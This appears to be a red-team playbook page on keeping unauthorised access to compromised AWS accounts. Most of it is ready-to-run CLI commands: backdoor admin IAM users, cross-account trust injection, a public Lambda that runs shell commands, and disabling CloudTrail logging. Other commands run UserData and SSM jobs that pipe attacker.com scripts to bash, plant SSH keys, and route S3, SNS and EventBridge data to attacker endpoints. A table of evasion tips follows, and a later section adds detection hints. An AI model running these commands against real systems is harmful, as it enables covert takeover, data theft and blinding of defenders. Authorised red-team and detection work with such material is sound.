# AWS Persistence Techniques
> **MITRE ATT&CK**: Persistence > T1098.001 - Account Manipulation: Additional Cloud Credentials
> **Platforms**: AWS
> **Required Privileges**: Medium to High
> **OPSEC Risk**: Medium

## Strategic Overview

AWS persistence is about maintaining access after initial compromise even if the original
entry vector is remediated. The challenge is that every API call is logged to CloudTrail,
making persistence inherently visible to a well-configured SOC. A red team lead must
balance durability of access with stealth, choosing mechanisms that blend with normal
administrative activity and resist incident response playbooks.

## Technical Deep-Dive

### IAM-Based Persistence

```bash
# Create a new IAM user with admin policy
aws iam create-user --user-name svc-cloudwatch-metrics
aws iam attach-user-policy --user-name svc-cloudwatch-metrics \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name svc-cloudwatch-metrics
aws iam create-login-profile --user-name svc-cloudwatch-metrics \
  --password 'Svc$Metr1cs!2024' --no-password-reset-required

# Create access keys for existing high-privilege users (stealthier)
aws iam create-access-key --user-name existing-admin
# Note: Users can have max 2 access keys. Check first:
aws iam list-access-keys --user-name existing-admin

# Add inline policy to existing user/role (harder to spot than managed policies)
aws iam put-user-policy --user-name existing-user --policy-name AuditReadOnly \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'
```

### Cross-Account Role Trust Modification

```bash
# Modify an existing role's trust policy to allow your external account
aws iam update-assume-role-policy --role-name ExistingRole \
  --policy-document '{
    "Version":"2012-10-17",
    "Statement":[{
      "Effect":"Allow",
      "Principal":{"AWS":["arn:aws:iam::LEGIT_ACCT:root","arn:aws:iam::ATTACKER_ACCT:root"]},
      "Action":"sts:AssumeRole"
    }]
  }'

# Now assume from attacker account at any time
aws sts assume-role --role-arn arn:aws:iam::TARGET:role/ExistingRole \
  --role-session-name maintenance --profile attacker-account
```

### Lambda Backdoors

```bash
# Create a Lambda with function URL (direct HTTP invocation, no API Gateway needed)
aws lambda create-function --function-name metrics-processor \
  --runtime python3.9 --role arn:aws:iam::ACCT:role/LambdaAdminRole \
  --handler index.handler --zip-file fileb://backdoor.zip
aws lambda create-function-url-config --function-name metrics-processor \
  --auth-type NONE  # Publicly accessible!

# Lambda backdoor code (backdoor.zip -> index.py):
# import boto3, subprocess, json
# def handler(event, context):
#     cmd = event.get('queryStringParameters',{}).get('cmd','id')
#     return {'statusCode':200,'body':subprocess.getoutput(cmd)}

# Event-triggered Lambda (fires on S3 upload, CloudWatch event, etc.)
aws lambda add-permission --function-name metrics-processor \
  --statement-id s3-trigger --action lambda:InvokeFunction \
  --principal s3.amazonaws.com --source-arn arn:aws:s3:::target-bucket
```

### CloudTrail Evasion

```bash
# Stop CloudTrail logging (VERY NOISY - last resort)
aws cloudtrail stop-logging --name default-trail

# More subtle: Modify event selectors to exclude specific API calls
aws cloudtrail put-event-selectors --trail-name default-trail \
  --event-selectors '[{"ReadWriteType":"WriteOnly","IncludeManagementEvents":true,
  "DataResources":[]}]'
# This drops all read-only events from logging

# Delete specific trail (if multiple trails exist)
aws cloudtrail delete-trail --name secondary-audit-trail

# Note: CloudTrail sends to S3; you can also modify bucket policy
# to deny PutObject from CloudTrail (breaks log delivery silently)
```

### EC2 Instance Backdoors

```bash
# UserData script persistence (runs on every instance start)
# Encode your backdoor
USERDATA=$(echo '#!/bin/bash
curl https://attacker.com/beacon.sh | bash' | base64)

aws ec2 modify-instance-attribute --instance-id i-0abc123 \
  --user-data "Value=$USERDATA"
# Note: Instance must be stopped first for UserData changes

# SSM Agent persistence (if SSM is configured)
aws ssm create-association --name "AWS-RunShellScript" \
  --targets "Key=instanceids,Values=i-0abc123" \
  --parameters '{"commands":["curl https://attacker.com/c2.sh | bash"]}' \
  --schedule-expression "rate(6 hours)"

# Authorized keys injection via SSM
aws ssm send-command --instance-ids i-0abc123 \
  --document-name "AWS-RunShellScript" \
  --parameters 'commands=["echo ssh-rsa AAAA...attacker >> /home/ec2-user/.ssh/authorized_keys"]'
```

### S3 and Messaging Persistence

```bash
# S3 event notification to attacker-controlled Lambda
aws s3api put-bucket-notification-configuration --bucket sensitive-data \
  --notification-configuration '{
    "LambdaFunctionConfigurations":[{
      "LambdaFunctionArn":"arn:aws:lambda:us-east-1:ATTACKER_ACCT:function:exfil",
      "Events":["s3:ObjectCreated:*"]
    }]
  }'

# SNS subscription for data forwarding
aws sns subscribe --topic-arn arn:aws:sns:us-east-1:ACCT:alerts \
  --protocol https --notification-endpoint https://attacker.com/collect

# SQS queue as dead letter or secondary consumer
aws sqs create-queue --queue-name audit-dlq
aws sqs set-queue-attributes --queue-url https://sqs.../audit-dlq \
  --attributes '{"Policy":"{\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":\"*\",\"Action\":\"sqs:SendMessage\"}]}"}'
```

### EventBridge Persistence

```bash
# Create an EventBridge rule that triggers on specific API calls
aws events put-rule --name security-audit-processor \
  --event-pattern '{"source":["aws.iam"],"detail-type":["AWS API Call via CloudTrail"],
  "detail":{"eventName":["CreateUser","CreateAccessKey"]}}' \
  --state ENABLED

aws events put-targets --rule security-audit-processor \
  --targets '[{"Id":"exfil","Arn":"arn:aws:lambda:us-east-1:ACCT:function:exfil-func"}]'
# Now every IAM credential creation triggers your Lambda
```

### Organization-Level Persistence

```bash
# If you compromise the management account:
# Modify Service Control Policies to create exemptions
aws organizations create-policy --name "Audit-Exception" --type SERVICE_CONTROL_POLICY \
  --content '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'

# Attach to attacker-controlled member account
aws organizations attach-policy --policy-id p-abc123 --target-id ACCT_ID
```

## Detection & Evasion

| Persistence Mechanism      | Detection Source          | Evasion Strategy                      |
|----------------------------|---------------------------|---------------------------------------|
| New IAM user               | CloudTrail, Config        | Use service-like naming conventions   |
| New access keys            | CloudTrail, IAM report    | Create for existing service accounts  |
| Lambda function            | CloudTrail, Config        | Name to match existing patterns       |
| CloudTrail modification    | CloudTrail (meta-alert)   | Modify selectors instead of stopping  |
| Cross-account trust        | IAM Access Analyzer       | Add to existing trust, don't replace  |
| EventBridge rules          | CloudTrail                | Use names matching existing rules     |

---

## 2025 Techniques: AWSDoor Persistence Framework

AWSDoor (Wavestone/RiskInsight, September 2025) automates deployment of multiple persistence
techniques that blend with legitimate administrative activity.

### AWSDoor IAM-Based Persistence

```bash
# Trust Policy Backdoor: Inject attacker AWS account into role trust policies
# Enables cross-account AssumeRole from attacker's account
# Detection: Monitor UpdateAssumeRolePolicy events in CloudTrail

# NotAction Policy Abuse: Uses NotAction + Allow in IAM policies
# Grants admin-equivalent privileges while APPEARING restrictive
# Detection: Flag any NotAction + Allow combinations in IAM policies
```

### AWSDoor Compute-Based Persistence

```bash
# Lambda Backdoor: Over-privileged Lambda with hidden malicious code
# Exposed via API Gateway or Function URLs
# Detection: Audit UpdateFunctionConfiguration events

# Lambda Layer Poisoning: Hides backdoors in Lambda Layers
# e.g., modified requests.get() in a Python layer
# NOT visible in Lambda console -- only in layer inspection
# Detection: Restrict layer updates to CI/CD pipelines only

# EC2 SOCKS Proxy: Uses SSM to establish SSH reverse tunnels for pivoting
# Detection: Deploy EDR on instances; monitor SSM sessions

# EBS Snapshot Exfiltration: Creates snapshots, shares with attacker accounts
# Mounts externally to extract data (e.g., NTDS.DIT from domain-joined EC2)
# Detection: Monitor CreateSnapshot and ModifySnapshotAttribute
```

### AWSDoor Defense Evasion

```bash
# CloudTrail Manipulation: Deactivates trails or manipulates event selectors
# Trail appears active while actually suppressing logs
# Detection: Monitor StopLogging and PutEventSelector; baseline log volume

# Organization Detachment: Removes account from AWS Organization
# Strips SCPs and centralized logging
# Deploy SCP with explicit Deny on organizations:LeaveOrganization
```

### AWSDoor Destructive

```bash
# S3 Shadow Deletion: Creates lifecycle policy with 1-day expiration
# Deletions happen asynchronously without CloudTrail attribution
# Detection: Monitor PutBucketLifecycleConfiguration; enable versioning
```

---

## Cross-References

- [AWS Initial Access](aws-initial-access.md)
- [AWS IAM Privilege Escalation](aws-iam-escalation.md)
- [AWS Services Abuse](aws-services-abuse.md)
- **Cloud Persistence** (04-persistence/cloud-persistence.md) -- Cross-cloud persistence patterns

## References

- https://hackingthe.cloud/aws/post_exploitation/
- https://github.com/RhinoSecurityLabs/pacu
- https://docs.aws.amazon.com/awscloudtrail/latest/userguide/
- https://attack.mitre.org/techniques/T1098/001/
- AWSDoor: https://www.riskinsight-wavestone.com/en/2025/09/awsdoor-persistence-on-aws/
